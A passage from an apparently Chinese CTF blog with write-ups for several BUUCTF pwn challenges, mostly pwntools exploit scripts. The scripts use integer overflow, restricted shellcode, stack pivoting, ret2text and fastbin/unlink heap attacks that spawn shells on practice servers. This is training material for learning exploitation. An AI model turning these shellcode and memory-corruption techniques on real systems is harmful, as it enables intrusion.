class="hljs-built_in">int</span>(ru(<span class="hljs-string">&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>])-<span class="hljs-number">96</span><br><span class="hljs-keyword">if</span> main_arena_low_4byte &lt; <span class="hljs-number">0</span>:<br>   main_arena_low_4byte += <span class="hljs-number">0x100000000</span><br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;main_arena=&#x27;</span>+<span class="hljs-built_in">hex</span>(main_arena_low_4byte)<br>malloc_hook_low_4byte = (main_arena_low_4byte &amp; <span class="hljs-number">0xFFFFF000</span>) + (libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>] &amp; <span class="hljs-number">0xFFF</span>)<br>libc_base_low_4byte=malloc_hook_low_4byte-libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>stdin_filno_low_4byte=libc_base_low_4byte+libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdin_&#x27;</span>]+<span class="hljs-number">0x70</span><br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;libc_base_low_4byte=&#x27;</span>+<span class="hljs-built_in">hex</span>(libc_base_low_4byte)<br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;stdin_filno_low_4byte=&#x27;</span>+<span class="hljs-built_in">hex</span>(stdin_filno_low_4byte)<br>add(<span class="hljs-number">2</span>,stdin_filno_low_4byte&amp;<span class="hljs-number">0xffff</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">666</span>)<br>leave(<span class="hljs-string">&#x27;a&#x27;</span>)<br><span class="hljs-comment">#debug()</span><br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="wustctf2020-number-game">wustctf2020_number_game</h3><p>参考师傅：[<a href="https://blog.csdn.net/mcmuyanga/article/details/114823490">BUUCTF]PWN——wustctf2020_number_game_mcmuyanga的博客-CSDN博客</a></p><p>这题有意思，我们被要求输个负数，取反后还要是负数，才能开shell</p><p>我们输入数据后会转换成补码（负数的补码=原码取反+1）存放在内存中，32位int型表示的范围是<code>-2147483648~2147483647</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">26350</span> )<br>r.sendline(<span class="hljs-string">&#x27;-2147483648&#x27;</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="护网杯-2018-gettingstart">护网杯_2018_gettingstart</h3><p>（浮点数内存表示）</p><p>参考师傅：<a href="https://www.yuque.com/u239977/cbzkn3/hp33wd">护网杯_2018_gettingstart（浮点数内存表示） · 语雀 (yuque.com)</a></p><p>主要就是double怎么转化到计算机里存储的</p><p>一个在线计算网站：</p><p><a href="http://www.binaryconvert.com/convert_double.html?decimal=048046049">Double (IEEE754 Double precision 64-bit) Converter (binaryconvert.com)</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">29374</span> )<br>r.sendline(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p64(<span class="hljs-number">0x7FFFFFFFFFFFFFFF</span>)+p64(<span class="hljs-number">0x3FB999999999999A</span>))<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="starctf-2019-babyshell">starctf_2019_babyshell</h3><p>（有限制的shellcode）</p><p>参考师傅： <a href="https://blog.csdn.net/Y_peak/article/details/115409705">BUUCTF-pwn]——starctf_2019_babyshell_Y_peak的博客-CSDN博客_starctf_2019_babyshell</a></p><p>能绕过循环检查\x00</p><p>\x00B后面加上一个字符， 对应一个汇编语句</p><p>\x00J\x00也行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25763</span> )<br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>sc=asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    mov rbx, 0x68732f6e69622f  </span><br><span class="hljs-string">    push rbx</span><br><span class="hljs-string">    push rsp </span><br><span class="hljs-string">    pop rdi</span><br><span class="hljs-string">    xor esi, esi               </span><br><span class="hljs-string">    xor edx, edx           </span><br><span class="hljs-string">    push 0x3b</span><br><span class="hljs-string">    pop rax</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br>r.send(<span class="hljs-string">&#x27;\x00bb&#x27;</span>+sc)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="picoctf-2018-buffer-overflow-0">picoctf_2018_buffer overflow 0</h3><p>ssh-p 27306 <a href="mailto:CTFMan@node4.buuoj.cn">CTFMan@node4.buuoj.cn</a></p><p>连入ssh，输入密码guest</p><p>这里的函数signal(11, sigsegv_handler);</p><p>如果是无效的内存引用就执行sigsegv_handler函数，</p><p>里面是fprintf(stderr, “%s\n”, flag)</p><p>以字符串的形式发送flag到stderr流当中</p><p>stderr：【unix】标准输出(设备)文件，对应终端的屏幕。进程将从标准输入文件中得到输入数据，将正常输出<a href="https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E8%BE%93%E5%87%BA/5885826">数据输出</a>到标准输出文件，而将错误信息送到标准错误文件中。在C中，程序执行时，一直处于开启状态。</p><p><a href="https://www.cnblogs.com/jing1617/p/8213840.html">Linux常用系统函数 - tigerloveapple - 博客园 (cnblogs.com)</a>：</p><p>getegid()用来取得执行目前进程有效组识别码. 有效的组识别码用来决定进程执行时组的权限.</p><p>返回值：返回有效的组识别码.</p><p>getresgid() 分别获取真实的,有效的和保存过的组标识号</p><p>这题我们</p><p>./vuln argv[1]</p><p>./vuln aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</p><p>多输几个a就会输出flag</p><p>参考师傅：<a href="https://www.jianshu.com/p/891debfabf32">picoctf_2018_buffer overflow 0（7/100） - 简书 (jianshu.com)</a></p><h3 id="BSidesCF-2019-Runit">[BSidesCF 2019]Runit</h3><p>（shellcode）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import * </span><br>local_file  = <span class="hljs-string">&#x27;./runit&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">28642</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#----------------------------</span><br>context.arch=<span class="hljs-string">&#x27;i386&#x27;</span><br>sc=asm(shellcraft.sh())<br>sl(sc)<br>r.interactive()<br><br><br></code></pre></td></tr></table></figure><h3 id="wdb-2018-3rd-soEasy">wdb_2018_3rd_soEasy</h3><p>(栈迁移)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import * </span><br>local_file  = <span class="hljs-string">&#x27;./wdb_2018_3rd_soEasy&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">29461</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#----------------------------</span><br>leave_ret=<span class="hljs-number">0x08048478</span><br>context.arch=<span class="hljs-string">&#x27;i386&#x27;</span><br>ru(<span class="hljs-string">&#x27;Hei,give you a gift-&gt;0x&#x27;</span>)<br>context.arch=<span class="hljs-string">&#x27;i386&#x27;</span><br>sc=asm(shellcraft.sh())<br>stack=<span class="hljs-built_in">int</span>(rc(<span class="hljs-number">8</span>),<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(stack)<br>sl(<span class="hljs-string">&#x27;aaaa&#x27;</span>+sc.ljust(<span class="hljs-number">0x48</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)+p32(stack)+p32(leave_ret))<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="suctf-2018-stack">suctf_2018_stack</h3><p>（栈平衡）</p><p>Ubuntu18要检查栈平衡</p><p><a href="https://blog.csdn.net/qq_41560595/article/details/112161243">ret2text涉及到的堆栈平衡问题_一路开花●-●的博客-CSDN博客</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> * <br>local_file  = <span class="hljs-string">&#x27;./SUCTF_2018_stack&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25323</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#---------------------------------------------</span><br>backdoor=<span class="hljs-number">0x400676</span><br>sl(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p64(backdoor+<span class="hljs-number">1</span>))<br><span class="hljs-comment">#sl(&#x27;a&#x27;*0x20+&#x27;b&#x27;*8+p64(backdoor+2))</span><br>r.interactive()<br></code></pre></td></tr></table></figure><p>实际操作的话加个ret就行，如果有限制，无脑的做法加减几个数试试</p><h3 id="hitcontraining-unlink">hitcontraining_unlink</h3><h4 id="fastbin-attack：">fastbin attack：</h4><p>修改fd与bk，用choice5，利用后门函数</p><p>还是不明白注释那里为啥会改到bk</p><p>参考师傅：[<a href="https://blog.csdn.net/mcmuyanga/article/details/113105091">BUUCTF]PWN——hitcontraining_unlink_mcmuyanga的博客-CSDN博客</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>local_file  = <span class="hljs-string">&#x27;./bamboobox&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;&#x27;</span>, )<br>    libc = ELF(remote_libc)<br><br>elf = ELF(local_file)<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br><br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>():<br>        sla(<span class="hljs-string">&#x27;Your choice:&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>        sla(<span class="hljs-string">&#x27;Your choice:&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>        sla(<span class="hljs-string">&#x27;Please enter the length of item name:&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>        sa(<span class="hljs-string">&#x27;Please enter the name of item:&#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,size,content</span>):<br>        sla(<span class="hljs-string">&#x27;Your choice:&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>        sla(<span class="hljs-string">&#x27;Please enter the index of item:&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br>        sla(<span class="hljs-string">&#x27;Please enter the length of item name:&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>        sa(<span class="hljs-string">&#x27;Please enter the new name of the item:&#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>        sla(<span class="hljs-string">&#x27;Your choice:&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>        sla(<span class="hljs-string">&#x27;Please enter the index of item:&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exit</span>():<br>        sla(<span class="hljs-string">&#x27;Your choice:&#x27;</span>,<span class="hljs-string">&#x27;5&#x27;</span>)<br>add(<span class="hljs-number">0x21</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x18</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0x18</span>,<span class="hljs-string">&#x27;bbbb&#x27;</span>)<span class="hljs-comment">#2</span><br>free(<span class="hljs-number">2</span>)<br>free(<span class="hljs-number">1</span>)<br>payload = <span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">0x20</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x21</span>)<span class="hljs-comment">#修改1的fd指针，指向main开始时申请的内存地址</span><br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x30</span>,payload)<br>add(<span class="hljs-number">0x18</span>,<span class="hljs-string">&#x27;AAA&#x27;</span>)<br>backdoor = <span class="hljs-number">0x0400D49</span><br>add(<span class="hljs-number">0x18</span>,p64(<span class="hljs-number">0</span>)+p64(backdoor))<br>exit()<br>debug()<br>r.interactive()<br></code></pre></td></tr></table></figure><h4 id="unlink做法：">unlink做法：</h4><p>unlink学习：<a href="https://blog.csdn.net/qq_41202237/article/details/108481889"> 好好说话之unlink_hollk’s blog-CSDN博客</a></p><p>本题具体步骤：</p><p>1.申请如下堆块</p><p><strong>chunk0:0x30</strong>（至少为0x30，有足够大小放入fake_chunk,0x8(prev_size) + 0x8(size) + 0x8(fd) + 0x8(bk) + 0x8(next_prev) + 0x8(next_size) = 0x30，这里0x8(next_prev) + 